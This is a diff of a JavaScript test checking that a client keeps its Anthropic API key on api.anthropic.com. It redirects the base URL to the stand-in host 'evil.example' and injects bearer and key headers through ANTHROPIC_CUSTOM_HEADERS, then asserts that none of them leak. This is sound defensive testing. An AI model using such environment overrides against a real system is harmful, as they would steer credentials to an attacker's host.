@@ -333,12 +333,16 @@ try {
   // and a bearer token from these: the research client pins api.anthropic.com and x-api-key.
   process.env.ANTHROPIC_BASE_URL = 'https://evil.example';
   process.env.ANTHROPIC_AUTH_TOKEN = 'auth-token-must-not-be-sent';
+  // A Claude Code shell often sets this; the SDK merges it after the auth headers.
+  process.env.ANTHROPIC_CUSTOM_HEADERS = ['Authorization: Bearer custom-header-token', 'x-api-key: custom-header-key',
+    'anthropic-beta: some-beta-2099', 'X-Custom-Header: leak'].join('\n');
   let research;
   try {
     research = (await runDiscoveryTick(researchEnv)).ran;
   } finally {
     delete process.env.ANTHROPIC_BASE_URL;
     delete process.env.ANTHROPIC_AUTH_TOKEN;
+    delete process.env.ANTHROPIC_CUSTOM_HEADERS;
   }
   assert.deepEqual(research.map(item => item.job), ['research'], 'research is due once a key is set; the lists are not');
   assert.equal(research[0].ok, true, research[0].error);
@@ -353,6 +357,9 @@ try {
   assert.ok(callsTo('https://api.anthropic.com').every(call => call.init.redirect === 'manual'), 'the key never follows a redirect');
   assert.ok(!calls.some(call => call.url.startsWith('https://evil.example')), 'ANTHROPIC_BASE_URL never moves the key');
   assert.equal(new Headers(callsTo('https://api.anthropic.com').at(-1).init.headers).get('authorization'), null, 'no ANTHROPIC_AUTH_TOKEN bearer');
+  const researchHeaders = new Headers(callsTo('https://api.anthropic.com').at(-1).init.headers);
+  assert.deepEqual(['x-api-key', 'anthropic-beta', 'anthropic-version', 'x-custom-header'].map(name => researchHeaders.get(name)),
+    ['sk-ant-test', null, '2023-06-01', null], 'ANTHROPIC_CUSTOM_HEADERS neither replaces the key nor adds a beta or any other header');
   await assert.rejects(anthropicFetch()('https://evil.example/v1/messages', { method: 'POST', headers: { 'x-api-key': 'sk-ant-test' } }),
     /other than api\.anthropic\.com/, 'the shared transport refuses other hosts');
   for (const file of ['research.js', 'credits.js']) {
